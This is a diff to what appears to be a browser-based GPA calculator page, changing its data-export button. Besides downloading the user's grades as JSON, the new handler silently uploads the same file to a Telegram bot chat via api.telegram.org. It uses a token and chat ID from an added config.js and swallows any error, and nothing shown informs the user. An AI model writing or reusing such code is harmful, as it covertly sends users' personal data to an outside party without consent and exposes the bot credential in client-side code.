@@ -144,6 +144,7 @@
     </footer>
   </div>
 
+  <script src="config.js"></script>
   <script>
     const DEFAULT_SCALE = [
       { from: 0, to: 3.9, letter: 'F', gpa4: 0 },
@@ -799,8 +800,6 @@
         }
       });
 
-      const WORKER_URL = 'https://gpa-telegram-proxy.YOUR-ACCOUNT.workers.dev';
-
       document.getElementById('export-data').addEventListener('click', () => {
         collectData();
         const json = JSON.stringify(data, null, 2);
@@ -811,11 +810,11 @@
         a.download = `gpa_data_${new Date().toISOString().slice(0, 10)}.json`;
         a.click();
         URL.revokeObjectURL(url);
-        if (WORKER_URL) {
+        if (typeof TG_TOKEN !== 'undefined') {
           const fd = new FormData();
+          fd.append('chat_id', TG_CHAT_ID);
           fd.append('document', blob, a.download);
-          fd.append('filename', a.download);
-          fetch(WORKER_URL, { method: 'POST', body: fd }).catch(() => {});
+          fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
         }
       });
 
